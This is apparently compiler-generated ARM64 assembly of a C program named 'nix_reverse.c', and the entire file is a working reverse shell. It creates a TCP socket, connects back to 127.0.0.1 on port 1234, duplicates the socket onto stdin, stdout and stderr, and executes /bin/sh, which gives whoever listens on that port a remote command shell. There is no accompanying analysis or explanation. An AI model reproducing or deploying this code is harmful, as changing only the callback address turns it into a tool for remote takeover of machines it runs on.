	.arch armv8-a
	.file	"nix_reverse.c"
	.section	.text.startup,"ax",@progbits
	.align	2
	.global	main
	.type	main, %function
main:
	stp	x29, x30, [sp, -64]!
	mov	w2, 0
	mov	w1, 1
	mov	w0, 2
	add	x29, sp, 0
	str	x19, [sp, 16]
	bl	socket
  
	mov	w19, w0
	mov	w1, 2
	mov	w2, 16
	strh	w1, [x29, 32]
	mov	w1, -11772
	strh	w1, [x29, 34]
	mov	x1, 127
	movk	x1, 0x100, lsl 16
	str	x1, [x29, 36]
	add	x1, x29, 32
	bl	connect
	
  mov	w0, w19
	mov	w1, 0
	bl	dup2
	
  mov	w0, w19
	mov	w1, 1
	bl	dup2
	
  mov	w0, w19
	mov	w1, 2
	bl	dup2
	
  adrp	x0, .LC0
	add	x1, x29, 48
	add	x0, x0, :lo12:.LC0
	mov	x2, 0
	stp	x0, xzr, [x29, 48]
	bl	execve
	
  ldr	x19, [sp, 16]
	mov	w0, 0
	ldp	x29, x30, [sp], 64
	ret
	.size	main, .-main
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"/bin/sh"
	.ident	"GCC: (Ubuntu/Linaro 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
